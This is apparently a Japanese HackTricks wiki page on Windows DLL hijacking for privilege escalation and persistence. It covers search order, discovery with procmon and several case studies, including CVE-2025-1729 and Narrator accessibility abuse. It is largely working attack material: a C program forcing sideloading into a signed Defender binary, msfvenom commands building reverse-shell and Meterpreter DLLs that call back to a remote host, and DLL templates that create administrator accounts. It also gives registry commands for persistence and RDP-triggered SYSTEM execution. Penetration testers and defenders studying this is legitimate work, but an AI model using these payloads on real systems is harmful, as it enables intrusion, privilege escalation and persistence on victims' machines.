# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションに悪意のある DLL を読み込ませるよう操作することを指します。この用語は **DLL Spoofing, Injection, and Side-Loading** のようないくつかの戦術を含みます。主にコード実行や永続化のため、そして稀に権限昇格のために利用されます。ここでは昇格に焦点を当てていますが、ハイジャックの手法自体は目的にかかわらず一貫しています。

### 一般的な手法

DLL hijacking にはいくつかの方法があり、各手法の有効性はアプリケーションの DLL ロード戦略に依存します:

1. **DLL Replacement**: 正規の DLL を悪意のあるものと差し替える。元の DLL の機能を保持するために DLL Proxying を併用することもある。
2. **DLL Search Order Hijacking**: 悪意のある DLL を正規のものより先に検索されるパスに置くことで、アプリケーションの検索順を悪用する。
3. **Phantom DLL Hijacking**: アプリケーションが必要だと判断して読み込もうとするが、実際には存在しない DLL 用に悪意のある DLL を作成する。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` といった検索パラメータを修正して、アプリケーションを悪意のある DLL に向ける。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規の DLL を悪意のあるものに置き換える。DLL side-loading に関連することが多い手法。
6. **Relative Path DLL Hijacking**: 悪意のある DLL をコピーしたアプリケーションと同じユーザー管理ディレクトリに配置することで、Binary Proxy Execution に似た状況を作る。

> [!TIP]
> HTML staging、AES-CTR 設定、.NET implants を DLL sideloading の上に重ねるステップバイステップのチェーンについては、以下のワークフローを参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls を見つける方法

システム内の missing Dlls を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つのフィルタを設定すること**です:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

そして **File System Activity** のみを表示します:

![](<../../../images/image (153).png>)

一般的な **missing dlls** を探している場合は、これを数秒間そのまま実行し続けます。\
特定の実行ファイル内の **missing dll** を探している場合は、別のフィルタ（例: "Process Name" "contains" `<exec name>`）を設定し、実行してからイベントのキャプチャを停止してください。

## Exploiting Missing Dlls

権限昇格を達成する最良のチャンスは、特権プロセスがロードしようとする DLL を、検索される場所のいずれかに書き込めることです。したがって、DLL が元の DLL のあるフォルダより先に検索されるフォルダに DLL を書き込める（稀なケース）、または元の DLL がどのフォルダにも存在しないために DLL が検索されるフォルダに書き込める、という状況が狙いになります。

### Dll Search Order

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) の中で、Dll がどのようにロードされるかの詳細を確認できます。

Windows アプリケーションはあらかじめ定義された検索パスのセットを順にたどって DLL を探します。悪意のある DLL をこれらのディレクトリのいずれかに戦略的に置くと、正規の DLL より先にロードされてしまうことで DLL hijacking の問題が発生します。これを防ぐには、アプリケーションが必要とする DLL を参照する際に絶対パスを使うようにすることが有効です。

以下は 32-bit システムにおける **DLL search order** です:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

これは **SafeDllSearchMode** が有効な場合のデフォルトの検索順です。これが無効になると current directory が第二位に上がります。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** のレジストリ値を作成し、0 に設定します（デフォルトは有効）。

もし [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) が **LOAD_WITH_ALTERED_SEARCH_PATH** フラグで呼ばれると、検索は **LoadLibraryEx** がロードしている実行モジュールのディレクトリから始まります。

最後に、**absolute path** を指定して dll がロードされる場合、その dll はそのパスでのみ検索されます（その dll に依存関係がある場合、それらは名前だけでロードされたときと同様に検索されます）。

検索順を変更する他の方法もありますが、ここでは説明しません。

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

新規作成するプロセスの DLL 検索パスに決定的に影響を与える高度な方法は、ntdll のネイティブ API を使ってプロセスを作成する際に RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに攻撃者が制御するディレクトリを指定すると、インポートされた DLL を名前で解決する（絶対パスを使っておらず、safe loading フラグを使っていない）ターゲットプロセスが、そのディレクトリから悪意ある DLL を読み込むよう強制できます。

要点
- RtlCreateProcessParametersEx でプロセスパラメータを構築し、あなたが管理するフォルダ（例: ドロッパー/アンパッカーが存在するディレクトリ）を指すカスタム DllPath を提供する。
- RtlCreateUserProcess でプロセスを作成する。ターゲットバイナリが名前で DLL を解決するとき、ローダーはこの提供された DllPath を参照して解決を行うため、悪意ある DLL がターゲット EXE と同居していない場合でも信頼できる sideloading を可能にする。

注意点 / 制限
- これは作成される子プロセスに影響します。SetDllDirectory が現在のプロセスにのみ影響するのとは異なります。
- ターゲットは名前で DLL を import または LoadLibrary している必要があります（絶対パスではなく、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使っていないこと）。
- KnownDLLs やハードコードされた絶対パスはハイジャックできません。フォワーディングされたエクスポートや SxS は優先順位を変える可能性があります。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>完全なC例: RTL_USER_PROCESS_PARAMETERS.DllPathによるDLL sideloadingの強制</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

運用時の例
- 悪意のある xmllite.dll（必要な関数をエクスポートするか、実際のものをプロキシするもの）をあなたの DllPath ディレクトリに置く。
- 上記の手法を使って名前で xmllite.dll を検索することが知られている signed binary を起動する。ローダーは提供された DllPath 経由でインポートを解決し、あなたの DLL を sideloads する。

この手法は実際の攻撃でマルチステージの sideloading チェーンを引き起こす例が観測されている：初期のランチャーがヘルパー DLL を配置し、それが Microsoft-signed で hijackable なバイナリをカスタム DllPath で起動して、ステージングディレクトリから攻撃者の DLL をロードさせる、という流れになることがある。


#### Windows ドキュメントの dll 検索順序に関する例外

Windows ドキュメントでは、標準の DLL 検索順序に対するいくつかの例外が記載されています：

- 既にメモリにロードされているものと同じ名前を持つ **DLL** に遭遇した場合、システムは通常の検索をバイパスします。代わりにリダイレクトと manifest のチェックを行い、それらがない場合に既にメモリにある DLL を使用します。**この場合、システムは DLL を検索しません**。
- 当該 DLL が現在の Windows バージョンでの **known DLL** と認識される場合、システムはその known DLL のバージョンと、それに依存する DLL を使用し、**検索プロセスを省略します**。これらの known DLL はレジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** にリストされています。
- もし **DLL に依存関係がある** 場合、これらの依存 DLL の検索は、最初の DLL がフルパスで指定されていたかどうかにかかわらず、それらが **モジュール名のみで示されている** かのように実行されます。

### 権限昇格

**必要条件**:

- 異なる権限で動作する、または今後動作する予定のプロセス（horizontal or lateral movement）を特定し、そのプロセスが **DLL を欠いている** ことを確認する。
- **DLL** が **検索される** 任意の **ディレクトリ** に対して **write access** があることを確保する。これは実行ファイルのディレクトリか、system path 内のディレクトリである可能性があります。

確かに条件は見つけにくい。デフォルトでは **特権を持つ実行可能ファイルが DLL を欠いているケースを見つけるのはかなり珍しい** 上に、**system path フォルダに書き込み権限があるのはさらに稀**（通常は不可能）です。しかし、 misconfigured な環境ではこれは可能です。\\
もし運良く条件を満たす状況を見つけたなら、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認してみてください。プロジェクトの **main goal of the project is bypass UAC** は UAC バイパスですが、使用可能な Windows バージョン向けの **PoC** の Dll hijaking が見つかるかもしれません（おそらく書き込み権限のあるフォルダのパスを変更するだけで済みます）。

注意：フォルダの権限を**確認する**には、次を実行します：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして **PATH内のすべてのディレクトリの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
実行ファイルの imports と dll の exports は次のように確認できます:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **Dll Hijackingを悪用して権限を昇格する** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)はsystem PATH内の任意のフォルダに書き込み権限があるかをチェックします。\
この脆弱性を発見するためのその他の興味深い自動化ツールは**PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll_です。

### 例

利用可能なシナリオを見つけた場合、成功させるために最も重要な点の一つは、**実行ファイルがそこからインポートする少なくとも全ての関数をエクスポートするdllを作成すること**です。なお、Dll Hijackingは[escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** 実行用のdll hijackingに焦点を当てたこの研究の中に、**how to create a valid dll**の例があります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、**次のセクション**ではテンプレートとして、または不要な関数をエクスポートする**dllを作成する**ために役立ついくつかの**基本的なdllコード**を見つけることができます。

## **Dllの作成とコンパイル**

### **Dll Proxifying**

基本的に、**Dll proxy**はロードされたときに**悪意のあるコードを実行する**ことができると同時に、実際のライブラリへのすべての呼び出しを中継して期待どおりに**公開**および**動作**することができるDllです。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使用すると、実行ファイルを指定してプロキシ化したいライブラリを選択し、**プロキシ化されたdllを生成**したり、**Dllを指定してプロキシ化されたdllを生成**したりできます。

### **Meterpreter**

**rev shell (x64) を取得:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する（x86、x64バージョンは見当たりませんでした）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分用

いくつかの場合、コンパイルするDllは被害者プロセスによってロードされる複数の関数を**export several functions**する必要があることに注意してください。これらの関数が存在しないと、**binary won't be able to load them**、そして**exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成を行う C++ DLL の例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリを持つ代替の C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows の Narrator.exe は起動時に予測可能な言語別の localization DLL をプローブします。これをハイジャックすると任意コード実行と永続化が可能になります。

Key facts
- プローブパス（現行ビルド）: `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- レガシーパス（旧ビルド）: `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore パスに書き込み可能な攻撃者制御の DLL が存在すると、それがロードされ `DllMain(DLL_PROCESS_ATTACH)` が実行されます。エクスポートは不要です。

Discovery with Procmon
- フィルター: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator を起動して、上記パスの読み込み試行を観察します。

最小限の DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 単純なハイジャックでは音声を出したりUIをハイライトします。黙らせるには、アタッチ時にNarratorのスレッドを列挙し、メインスレッドを開いて（`OpenThread(THREAD_SUSPEND_RESUME)`）`SuspendThread`で一時停止させ、自分のスレッドで処理を続行します。完全なコードはPoCを参照してください。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記を設定すると、Narratorを起動した際に植えたDLLがロードされます。セキュアデスクトップ（ログオン画面）では、CTRL+WIN+ENTERを押してNarratorを起動してください。

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストにRDP接続し、ログオン画面でCTRL+WIN+ENTERを押してNarratorを起動すると、あなたのDLLがセキュアデスクトップ上でSYSTEMとして実行されます。
- RDPセッションが閉じると実行は停止します — 速やかにinject/migrateしてください。

Bring Your Own Accessibility (BYOA)
- 組み込みのAccessibility Tool (AT) のレジストリエントリ（例: CursorIndicator）を複製し、任意のバイナリ/DLLを指すように編集してインポートし、`configuration`をそのAT名に設定できます。これによりAccessibilityフレームワーク経由で任意の実行がプロキシされます。

注意事項
- `%windir%\System32` 下に書き込み、HKLMの値を変更するには管理者権限が必要です。
- すべてのペイロードのロジックは `DLL_PROCESS_ATTACH` 内に置けます；エクスポートは不要です。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

この事例はLenovoのTrackPoint Quick Menu（`TPQMAssistant.exe`）における **Phantom DLL Hijacking** を示しており、追跡IDは **CVE-2025-1729** です。

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` は `C:\ProgramData\Lenovo\TPQM\Assistant\` にあります。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` はログオン中のユーザーのコンテキストで毎日9:30に実行されます。
- **Directory Permissions**: `CREATOR OWNER` によって書き込み可能で、ローカルユーザーが任意のファイルを置けます。
- **DLL Search Behavior**: 作業ディレクトリからまず `hostfxr.dll` をロードしようとし、欠落している場合 "NAME NOT FOUND" をログに記録します。これはローカルディレクトリの検索優先を示します。

### Exploit Implementation

攻撃者は同じディレクトリに悪意のある `hostfxr.dll` スタブを置き、欠落したDLLを利用してユーザーのコンテキストでコード実行を達成できます：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザーとして `hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置する。
2. 現在のユーザーコンテキストでスケジュールされたタスクが午前9:30に実行されるのを待つ。
3. タスク実行時に管理者がログインしていると、悪意ある DLL は管理者のセッションでミディアムインテグリティ (medium integrity) で実行される。
4. 標準的な UAC バイパス手法を連鎖させ、ミディアムインテグリティから SYSTEM 権限に昇格する。

## ケーススタディ: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

攻撃者はしばしば MSI ベースのドロッパーと DLL side-loading を組み合わせ、信頼された署名済みプロセスの下でペイロードを実行する。

Chain overview
- ユーザーが MSI をダウンロードする。GUI インストール中に CustomAction がサイレントに実行され（例: LaunchApplication や VBScript action）、埋め込まれたリソースから次段を再構築する。
- ドロッパーは正当な署名済み EXE と悪意のある DLL を同じディレクトリに書き込む（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名された EXE が起動されると、Windows の DLL 検索順序により最初に作業ディレクトリから wsc.dll がロードされ、署名済み親プロセスの下で攻撃者のコードが実行される (ATT&CK T1574.001)。

MSI analysis (what to look for)
- CustomAction テーブル:
- 実行可能ファイルや VBScript を実行するエントリを探す。例: 背景で埋め込まれたファイルを実行する LaunchApplication は疑わしいパターン。
- Orca (Microsoft Orca.exe) では、CustomAction、InstallExecuteSequence、Binary テーブルを確認する。
- MSI CAB 内の埋め込み/分割ペイロード:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- 複数の小さな断片が存在し、VBScript CustomAction によって連結・復号されるものを探す。一般的なフロー：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe を使った実践的な sideloading
- これらの2つのファイルを同じフォルダに配置する:
- wsc_proxy.exe: legitimate signed host (Avast)。プロセスは自分のディレクトリから名前で wsc.dll を読み込もうとします。
- wsc.dll: attacker DLL。特定の exports が不要なら DllMain だけで十分です。そうでない場合は proxy DLL を作成し、必要な exports を本物のライブラリへフォワードしつつ DllMain で payload を実行します。
- 最小限の DLL payload をビルドする:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- エクスポート要件については、プロキシングフレームワーク（例: DLLirant/Spartacus）を使用して、ペイロードも実行するフォワーディングDLLを生成してください。

- この手法はホストバイナリによるDLL名の解決に依存します。ホストが絶対パスやセーフロードフラグ（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijackは失敗する可能性があります。
- KnownDLLs、SxS、および forwarded exports は優先順位に影響を与える可能性があり、ホストバイナリとエクスポートセットの選定時に考慮する必要があります。

## 参考文献

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
